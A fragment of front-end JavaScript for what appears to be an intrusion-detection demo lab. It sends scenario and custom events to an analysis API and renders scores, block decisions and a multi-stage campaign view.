    var s = '<h4>Result</h4><div class="big">' + n + ' steps. Highest single-event score <b>' + lab.maxScore + ' (' + levelOf(lab.maxScore) + ')</b>. Original engine: <b>' + (lab.blocked ? 'blocked the address' : 'did not block') + '</b>.';
    if (c) s += ' Campaign view: <b>' + c.action + '</b>, risk <b>' + c.risk + '</b>, ' + c.stages.length + ' of 5 stages (' + esc(c.verdict.toLowerCase()) + ').';
    s += '</div>';
    if (c && c.engineMissed) s += '<p class="small mut" style="margin:8px 0 0">This is the gap the campaign view exists for: every step looked tolerable on its own, but together they are an intrusion.</p>';
    return s;
  }
  function runLab() {
    if (!lab.scn || lab.running || !MODEL) return;
    var sc = lab.scn; if (sc.fixedIp) { lab.ip = sc.fixedIp; $('#labIp').textContent = lab.ip; } else newIp();
    resetLab(); lab.running = true; lab.stop = false; $('#labRun').disabled = true; $('#labStop').disabled = false;
    var steps = sc.steps(), i = 0;
    (function next() {
      if (lab.stop || i >= steps.length) { done(); return; }
      var st = steps[i++], p = {}; Object.keys(st).forEach(function (k) { if (k !== 'label') p[k] = st[k]; }); p.ip = lab.ip;
      post('/api/platform/analyze', p).then(function (d) {
        lab.rows.push({ step: st, ev: d.event }); lab.maxScore = Math.max(lab.maxScore, d.event.score); lab.blocked = lab.blocked || d.event.blocked; lab.camp = d.campaign;
        var log = $('#labLog'); log.innerHTML = logHtml(); log.scrollTop = log.scrollHeight;
        showSel(lab.rows.length - 1); $('#labChain').innerHTML = chainPanel(d.campaign);
        setTimeout(next, sc.id === 'chain' ? 380 : 480);
      }).catch(function (e) { $('#labFinal').hidden = false; $('#labFinal').innerHTML = '<h4>Stopped</h4><div class="big">' + esc(e.message) + '</div>'; done(true); });
    })();
    function done(err) {
      lab.running = false; $('#labRun').disabled = false; $('#labStop').disabled = true;
      if (!err) { $('#labFinal').hidden = false; $('#labFinal').innerHTML = finalHtml(); }
      poll();
    }
  }
  $('#labRun').addEventListener('click', runLab);
  $('#labStop').addEventListener('click', function () { lab.stop = true; });
  $('#labNew').addEventListener('click', function () { newIp(); resetLab(); });
  $('#cSend').addEventListener('click', function () {
    if (lab.running) return; var k = $('#cKind').value, a = $('#cA').value, b = $('#cB').value, c = $('#cC').value, p = { kind: k, ip: lab.ip };
    if (k === 'web') { p.path = a; p.body = b; } else if (k === 'port') { p.port = c || a; } else if (k === 'download') { p.file = c || a; }
    else if (k === 'process') { p.path = a; p.command = b; } else if (k === 'win') { p.event = c || a; p.path = b; p.logon = 10; }
    else { p.user = a || 'guest'; p.country = c || 'IN'; }
    var step = { label: 'Custom: ' + k + ' ' + (a || c) };
    post('/api/platform/analyze', p).then(function (d) {
      lab.rows.push({ step: step, ev: d.event }); lab.maxScore = Math.max(lab.maxScore, d.event.score); lab.blocked = lab.blocked || d.event.blocked; lab.camp = d.campaign;
      $('#labLog').innerHTML = logHtml(); showSel(lab.rows.length - 1); $('#labChain').innerHTML = chainPanel(d.campaign); $('#labFinal').hidden = false; $('#labFinal').innerHTML = finalHtml(); poll();
    }).catch(function (e) { alert(e.message); });
  });

  /* ---------- boot ---------- */
  renderSteps(); renderScList(); newIp();
  loadModel().then(function () { poll(); pickScenario('chain'); }).catch(function () { $('#offline').classList.add('show'); });
  runSelfTest();
  setInterval(poll, 3000);
})();
